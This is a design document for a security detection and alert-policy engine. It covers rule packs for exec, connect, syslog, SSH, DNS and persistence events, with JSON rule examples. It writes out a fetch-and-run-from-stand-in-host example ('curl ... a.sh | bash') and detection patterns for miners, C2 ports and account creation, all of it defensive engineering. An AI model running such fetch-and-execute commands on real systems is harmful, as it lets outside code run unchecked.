# risk-identification Engine and Rule/Policy Design

**Languages:** English (this document) | [Simplified Chinese](18-risk-identification-engine-design.zh-CN.md)

**Document version:** v1.2
**Checked against current code:** 2026-09-21
**Audience:** security operations, detection engineering, and Skill maintainers  
**Related docs:** [Design Notes](../src/skills/risk-identification/DESIGN.md), [behavior-policy Declarative Engine Design](19-behavior-policy-engine-design.md), [Detection Catalog](../src/skills/risk-identification/detection-catalog.md)

This document explains how the `risk-identification` capability works: which part recognizes suspicious behavior, which part decides whether to alert, how operators can extend rules without changing Python code, and where traceability analysis consumes the resulting risk items.

**Reading by task:** Jump to the relevant section; reading every section in order is optional.

- [4. Detection Engine Architecture](#4-detection-engine-architecture)
- [8. Writing Detection Rules](#8-writing-detection-rules)
- [9. Policy Authoring Reference](#9-policy-authoring-reference)
- [15. Validation](#15-validation)

## 1. Goals

`risk-identification` answers two questions:

- **Detection layer:** what kind of suspicious behavior does this event look like?
- **Policy layer:** should this candidate become an alert, be downgraded, or keep its default severity?

It does not reconstruct cross-host attack chains, and it does not replace alert-confirmation workflows such as WAF payload false-positive review.

The design follows four principles:

- Keep detection and policy separate.
- Make common changes configurable by operators.
- Start from single-event or small-window evidence.
- Keep the engine thin and place domain knowledge in rule packs.

## 2. End-to-End Flow

The runtime flow is:

1. `dataasset` fetches source data from configured assets.
2. Evidence bundles are normalized into JSON events.
3. `assess.py` orchestrates completeness checks, host/time filtering, detection engines, deduplication, policy evaluation, the default environment whitelist, ATT&CK enrichment, and incident summarization.
4. The output `risk_items` are consumed by traceability analysis and reports.

The important boundary is that detection engines produce candidate facts, while `behavior-policy` decides the final behavior.

## 3. Two-Layer Model

The system has two major layers:

- **Detection rules** create initial risk items with fields such as `risk_type`, `severity`, `matched_rules`, `risk_tags`, and evidence.
- **Behavior policy rules** read those risk items and decide whether to force an alert, downgrade, apply a hard guardrail, or keep the default behavior.

This split avoids mixing security facts with environment policy. For example, `curl | bash` from a web process is still suspicious, but an organization may downgrade a known deployment path while keeping the detection visible.

### 3.1 Why Detection and Policy Are Separate

Detection rules should be stable, portable, and evidence-oriented. Policy rules are environment-sensitive and change more often. By separating them, operators can tune alert behavior without weakening the underlying detection catalog.

### 3.2 Whitelist Layer

After behavior-policy evaluation, a whitelist layer can suppress or mark trusted items. The CLI reads `whitelist.json` by default. It can be disabled with CLI flags or payload options when a raw assessment is required.

## 4. Detection Engine Architecture

The detection layer uses three engine profiles and shared output/condition modules.

### 4.1 Engine Profiles

| `engine` | Rule packs | Runtime class | Matching model |
| --- | --- | --- | --- |
| `pipeline` | `exec-rules.json` | `ExecRulesEngine` | structural rules, P0 regex, P1 keyword/regex, fallback, then context boost |
| `chain` | `connect-rules.json`, `syslog-rules.json`, `persistence-rules.json` | `RuleChainEngine` | ordered `rules[]` containing `when` and `severity` |
| `aggregate` | `ssh-rules.json`, `dns-rules.json` | `SshRulesEngine`, `DnsRulesEngine` | time-window grouping and behavior profiles |

Every rule pack declares its top-level `engine`. `rule_loader.py` checks that the
declared profile agrees with the file's supported engine so a pack cannot silently run
through the wrong evaluator.

### 4.2 Shared Modules

#### `detection_output.py`

This module normalizes `risk_tags`, `verdicts`, `actions`, and `confidence_base` from
rule packs into detection output. All six detection modules use it. Module-specific
behavior, such as exec noise handling or connect business fallbacks, remains in a thin
wrapper or adjustment hook.

#### `detection_rule_chain.py`

This module owns ordered evaluation for the `chain` profile:

1. Visit enabled `rules[]` in order.
2. Evaluate each `when` block and update matched IDs and best severity.
3. Collect tags through the shared output path.

Connect uses computed handlers such as `web_context` and `dst_private`. Persistence
uses flat clauses over structured changes. Syslog uses flat clauses for normalized
fields and then runs an additional regex pass over `message_rules[]`.

#### `shared_conditions.py`

The common condition DSL implements composition and primitives such as `all`, `any`,
`not`, `command_regex`, `predicate`, and `field_equals`. Connect/syslog
`when_extensions` and behavior-policy predicates use the same evaluator, which keeps
condition semantics aligned between detection and policy.

## 5. Detection Engines

### 5.1 Exec Pipeline

`exec-rules.json` is organized by priority and matching style:

- `p0_regex`
- `p1_regex`
- `p1_keywords`
- structural rules with context requirements

Rules explicitly name the field they match. Common fields include `command`, `exe`, `comm`, `cwd`, `listener_process`, and `command_line`.

The pipeline evaluates high-confidence signatures first, then contextual and lower-priority matches. A typical result contains a `matched_rule`, an initial `severity`, risk tags, and evidence fields.

Operators normally extend this layer by adding JSON rules, disabling noisy rules with `enabled: false`, and running validation.

### 5.2 Connect Chain

`connect-rules.json` evaluates outbound connection behavior. A rule can combine:

- host connection fields such as destination IP and port,
- nearby command-execution evidence,
- context flags such as `web_context`, `dst_private`, `port`, or `exec_download_nearby`,
- `when_extensions` for reusable computed conditions.

Examples include web-process egress to private database ports, suspicious download-related egress, or external beacon-like connections.

### 5.3 Syslog Chain

The syslog engine supports structured event rules and raw message regex rules. It can match event types, facilities, message patterns, and normalized fields.

SSH brute-force raw events are intentionally excluded from generic syslog alerting and are handled by the SSH aggregate module.

### 5.4 SSH Aggregate

`ssh-rules.json` groups authentication failures by victim host and source IP within a configured time window. Thresholds produce `ssh_bruteforce` risk items. The aggregate rule can align its `policy_rule_id` with behavior-policy rules such as `SSH-BRUTE-001`.

`assess.py` explicitly passes `params.ssh_brute_window_sec` (default 300) and `params.ssh_brute_threshold` (default 10), so use these parameters to tune aggregation through that entry point. Direct SSH engine calls without overrides use the rule pack's `brute_force.window_sec` / `threshold`. `thresholds[]` selects detection severity only after the burst threshold is reached; the subsequent `SSH-BRUTE-001` policy may promote the result to P0.

### 5.5 DNS Aggregate

`rules/dns-rules.json` and `DnsRulesEngine` cover NXDOMAIN bursts, suspected DGA, uncommon TLDs, suspected tunneling, and DoH/DoT egress. S8 enables this module by default. Without `dns_log`, only checks backed by `host_connect` can run. DNS indicators alone do not establish C2 or exfiltration volume.

### 5.6 Persistence Chain

`rules/persistence-rules.json` and `PersistenceRulesEngine` use `RuleChainEngine` to assess `host_persistence` changes to cron, systemd, SSH keys, profiles, sudoers, and other persistence locations. S5 variants select it through `scenarios.json`. `host_file_op` remains auxiliary context, not a standalone file detector.

## 6. Policy Engine Architecture

Policy evaluation is defined by:

- `behavior-policy.md` for human-readable operator policy.
- `behavior-policy.rules.json` for machine-readable rules.
- `policy_engine.py` for declarative evaluation.
- `behavior_policy.py` as the compatibility wrapper used by existing callers.

### 6.1 Rule Structure

The JSON pack contains:

- `version`
- `policy_id`
- `default_behavior`
- `predicates`
- `rules`

Each rule declares an ID, tier, conditions, behavior, and optional severity/verdict overrides.

### 6.2 Priority

Policy tiers are evaluated in this order:

1. `hard_guardrail`
2. `force_alert`
3. `downgrade`
4. `default`

This means an operator downgrade cannot override a hard guardrail.

### 6.3 How Policy References Detection

Policy rules can reference detection output with condition keys such as:

- `matched_rules_any`
- `matched_rules_all`
- `risk_module`
- `command_regex`
- `command_contains`
- `event_type`
- `predicate`
- `dst_port_in`
- `dst_ip_in`
- `severity_in`
- `guardrail_matched`

Reusable predicates are defined declaratively in `behavior-policy.rules.json` and implemented through shared condition primitives.

## 7. Detection + Policy Example

Assume an `nginx:443` worker process runs:

```text
curl http://example.invalid/a.sh | bash
```

The detection layer can emit a `download_and_execute` risk item with a high initial severity. Policy then evaluates environment context:

- If the evidence matches a malicious download pattern, a `force_alert` rule can keep or raise the severity.
- If the same pattern is part of an approved deployment path, a `downgrade` rule can lower the behavior while preserving the detection.
- If no policy rule matches, default behavior applies.

The final risk item keeps both the detection fact and the policy decision, which makes later traceability analysis explainable.

## 8. Writing Detection Rules

Use [Detection Catalog](../src/skills/risk-identification/detection-catalog.md) and the existing rule packs as the primary references.

### 8.1 Detection or Policy?

Use detection rules when the event itself indicates suspicious behavior. Use policy rules when the same detection should be treated differently because of environment, asset role, operator-approved workflows, or incident-response policy.

### 8.2 Conventions

- Keep top-level engine structure stable.
- Use rule IDs as `matched_rule` values.
- Escape backslashes correctly in JSON regex strings.
- Prefer `enabled: false` for temporary suppression over deleting rules.
- Run validation after rule changes.

### 8.3 Exec Rules

Typical exec additions include new regexes for crypto miners, reverse shells, webshell writes, or download-and-execute patterns. Add risk tags when the result should be consumed by ATT&CK enrichment or traceability patterns.

To add a mining signature, append this fragment to `p1_regex` in `rules/exec-rules.json` (or `p0_regex` if the reviewed severity is P0). Version 1.2+ requires an explicit `field` on every regex/keyword entry:

```json
{
  "id": "crypto_miner",
  "field": "command",
  "pattern": "\\bxmrig\\b|minerd|cpuminer|stratum\\+tcp",
  "flags": "i",
  "enabled": true,
  "note": "Common mining clients or the stratum protocol"
}
```

Add `"crypto_miner": ["impact", "resource_hijacking"]` to `risk_tags`. Keep detection separate from environment-specific alert decisions. The fragments here extend an existing rule pack; they are not complete replacement files.

### 8.4 Connect Rules

Connect rules are suitable for outbound behavior such as a web process connecting to private Redis on `6379`, suspicious egress near a download event, or external control-plane connections.

Use built-in `when` keys first. Add `when_extensions` only when the condition is reusable and cannot be represented by existing fields.

For example, to identify web-context connections to internal Redis, confirm `6379` is in `common_service_ports` and insert this rule near the beginning of `rules[]`, before broader fallbacks:

```json
{
  "id": "redis_lateral_from_web",
  "severity": "P1",
  "enabled": true,
  "note": "Web process connecting to internal Redis; investigate possible lateral probing",
  "when": {
    "web_context": true,
    "dst_private": true,
    "dst_port_in": [
      6379
    ]
  }
}
```

Built-in connect conditions include:

| `when` key | Meaning |
| --- | --- |
| `web_context` | The listener process or port belongs to a web entry point |
| `dst_private` | The destination belongs to a private CIDR |
| `dst_port_in` | The port is in a literal list or a named list such as `suspicious_ports` |
| `exec_download_nearby` | Nearby host-execution evidence contains `curl` or `wget` |
| `no_matched_rules` | No earlier ordered rule matched |
| `severity_worse_than` | Current best severity is lower than the requested level |

Use `when_extensions` to define a reusable condition without adding Python:

```json
"when_extensions": {
  "high_risk_egress": {
    "all": [
      { "field_equals": { "field": "web_context", "value": true } },
      { "field_equals": { "field": "dst_private", "value": false } }
    ]
  }
},
"rules": [
  {
    "id": "external_c2_connect",
    "severity": "P0",
    "when": { "high_risk_egress": true }
  }
]
```

Rules remain ordered. Put narrow, high-confidence rules before broad fallbacks. A later
rule can use `keep_severity_if` to preserve an earlier, more severe result.

For a replay, inspect `matched_rules` for `redis_lateral_from_web` as well as the final severity: later policy/whitelist processing may change alert behavior.

### 8.5 Syslog Rules

Syslog rules can match normalized event types or raw message text. For example, a structured `docker_exec` event can become P1, while a message regex can detect suspicious `sudo useradd` activity.

Add a structured event rule to `rules[]`:

```json
{
  "id": "docker_exec",
  "severity": "P1",
  "enabled": true,
  "when": { "event_type": "docker_exec" }
}
```

Add a raw-message expression to `message_rules[]`:

```json
{
  "id": "sudo_useradd",
  "pattern": "useradd|adduser",
  "flags": "i",
  "severity": "P0",
  "enabled": true,
  "event_types": ["sudo_command", "account_created"]
}
```

Do not duplicate SSH brute-force raw-event rules here. Those event types are excluded
from generic syslog alerting and assessed by the SSH aggregate engine.

### 8.6 SSH Rules

SSH aggregate rules define grouping and severity thresholds. Through `assess.py`, set `params.ssh_brute_window_sec` and `params.ssh_brute_threshold` for the window and burst threshold. For a detection-layer example with five failures producing P2 and fifteen producing P0, set the burst threshold to five and adjust `thresholds[]`; the alert policy can still force P0. There is no `time_window_seconds` field for this module.

```json
"thresholds": [
  { "min_count": 15, "severity": "P0", "enabled": true },
  { "min_count": 5, "severity": "P2", "enabled": true }
],
"brute_force": {
  "window_sec": 300,
  "threshold": 5,
  "suppress_self_loop": true
},
"brute_force_rule": {
  "matched_rule": "ssh_bruteforce",
  "policy_rule_id": "SSH-BRUTE-001",
  "risk_tags": ["credential_access", "brute_force"]
}
```

Keep `brute_force_rule.policy_rule_id` aligned with the behavior-policy rule so ATT&CK
enrichment and traceability can reference the same decision.

## 9. Policy authoring reference

Policy structure, predicates, tiers, and condition examples are maintained in the [policy engine reference](19-behavior-policy-engine-design.md). Detection owns labels and initial severity; final alert changes require synchronized policy Markdown/JSON and positive/negative replay.

## 10. End-to-End Examples

### 10.1 Jenkins Plugin Install

A Jenkins process in a web container runs a `curl | bash` installer. Detection still emits `download_and_execute`. A policy predicate such as `is_jenkins_plugin_install` can downgrade the final behavior through a rule like `OPS-JENKINS-001`.

1. Retain the existing `download_and_execute` detection for auditability.
2. Add the predicate below to `predicates` in `rules/behavior-policy.rules.json`:

```json
"is_jenkins_plugin_install": {
  "command_regex": "jenkins\\.example\\.com.*plugin|/var/jenkins_home.*curl.*\\|.*sh",
  "flags": "i"
}
```

3. Add this policy rule to `rules[]`:

```json
{
  "id": "OPS-JENKINS-001",
  "tier": "downgrade",
  "modules": ["exec"],
  "when": { "predicate": "is_jenkins_plugin_install" },
  "decision": {
    "severity": "P3",
    "alert_required": false,
    "alert_suppressed": true,
    "verdict": "benign",
    "recommended_action": "log_only",
    "reason": "Approved Jenkins plugin installation script"
  }
}
```

4. Add the corresponding `OPS-JENKINS-001` entry to `behavior-policy.md`.
5. Run `make validate-policy` and replay a synthetic Jenkins command. Verify that the detection remains visible and inspect the matched policy, severity, and suppression fields. Narrow the predicate to the approved environment before use; matching this example alone does not establish that an arbitrary command is safe.

### 10.2 Web Process Connects to C2 Port

A connect rule can recognize web-process egress to a suspicious external port. A policy rule such as `CONNECT-C2-001` can force alerting even if other context appears benign.

The current `CONNECT-C2-001` rule is:

```json
{
  "id": "CONNECT-C2-001",
  "tier": "force_alert",
  "modules": [
    "connect"
  ],
  "when": {
    "dst_port_in": [
      4444,
      1337,
      31337,
      5555,
      9001
    ]
  },
  "decision": {
    "severity": "P0",
    "alert_required": true,
    "alert_suppressed": false,
    "verdict": "confirmed_attack",
    "recommended_action": "investigate_and_contain",
    "reason": "Outbound connection to a high-risk C2 port"
  }
}
```

For a synthetic connection on a listed port, inspect the connect detection and `policy_rule_id=CONNECT-C2-001`, then the final alert fields after whitelist processing. The action is a recommendation; this rule does not execute host isolation.

### 10.3 Detection Rule Referenced by Traceability

When adding a new `matched_rule`, also consider:

- adding ATT&CK mapping,
- adding or updating behavior policy,
- referencing the rule in `chain-patterns` if it represents an attack stage.

Traceability consumes these tags to build incident narratives.

## 11. Rules Directory

| File | Purpose |
| --- | --- |
| `exec-rules.json` | command-execution detection |
| `connect-rules.json` | outbound connection detection |
| `syslog-rules.json` | syslog detection |
| `ssh-rules.json` | SSH brute-force aggregation |
| `dns-rules.json` | DNS profiles and DoH/DoT egress |
| `persistence-rules.json` | persistence changes |
| `behavior-policy.rules.json` | policy decision rules |
| `attck-map.json` | ATT&CK enrichment |
| `chain-patterns.json` | multi-stage traceability narratives |

`chain-patterns` does not replace risk-identification. It consumes detection outputs such as `matched_rules`, `policy_rule_id`, and risk tags to describe multi-stage behavior.

### 11.1 How Chain Patterns Relate to Detection and Policy

- Detection emits `matched_rules[]`, risk tags, and any initial `policy_rule_id` link.
- `chain-patterns.json` groups those identifiers into stages of a multi-stage narrative.
- `traceability-analysis` consumes the patterns and evidence; risk-identification does
  not reconstruct the cross-host chain itself.

Risk-identification therefore guarantees the meaning of each point detection. Whether
the evidence completes a chain remains a traceability decision.

## 12. Agent and CLI Paths

| Path | Primary policy source | Notes |
| --- | --- | --- |
| CLI/CI | JSON rules | deterministic validation and release checks |
| Intelligent agent invoking `assess.py` | same JSON policy engine | Markdown provides rationale and Skill context |

The maintenance loop is: edit the markdown policy, sync JSON rules, then validate IDs and replay positive and negative examples.

## 13. Extension Points

| Change | Usually requires Python? |
| --- | --- |
| new regex, keyword, port, or threshold | no |
| policy behavior change | no |
| predicate assembled from existing fields | no |
| reusable `when_extensions` condition | usually no |
| new computed context field | yes |
| new condition type | yes |
| new detection module | yes |

## 14. Code Module Index

| Module | Role |
| --- | --- |
| `assess.py` | orchestration |
| `rule_loader.py` | JSON loading and engine-profile validation |
| `exec_rules.py` | exec detection |
| `policy_engine.py` | declarative policy evaluation |
| `behavior_policy.py` | compatibility wrapper |
| `ssh_rules.py` | SSH aggregation |
| `connect_rules.py` | outbound connection detection |
| `syslog_rules.py` | structured system risk events |
| `dns_rules.py` | DNS and DoH/DoT detection |
| `persistence_rules.py` | persistence change detection |
| `shared_conditions.py` | reusable conditions |
| `detection_rule_chain.py` | chain-rule evaluation helpers |
| `detection_output.py` | normalized detection outputs |
| `attck_map.py` | ATT&CK enrichment |
| `incident_aggregator.py` | `top_incidents` aggregation |
| `source_risk_map.py` | source coverage and data-gap reminders |

## 15. Validation

Run the focused checks after changing detection or policy rules:

```bash
.venv/bin/python -m unittest discover -s src/skills/risk-identification/tests -p 'test_*.py'
make validate-policy
```

For release cleanup, also run:

```bash
make docs-check
.venv/bin/python src/scripts/release_scan.py --json
```

Report metadata stores repository-owned policy, whitelist, and detection-rule paths relative to the repository root. User-supplied paths outside the repository remain explicit; published fixtures must not contain a developer home path. `make ci` and the archive verifier scan again after regenerating demo reports.

## 16. Related Docs

- [behavior-policy Declarative Engine Design](19-behavior-policy-engine-design.md)
- [Trace Profile Design](21-trace-profile-design.md)
- [Traceability Analysis Operations Configuration Guide](../docs_user/25-traceability-analysis-ops-config-guide.zh-CN.md)
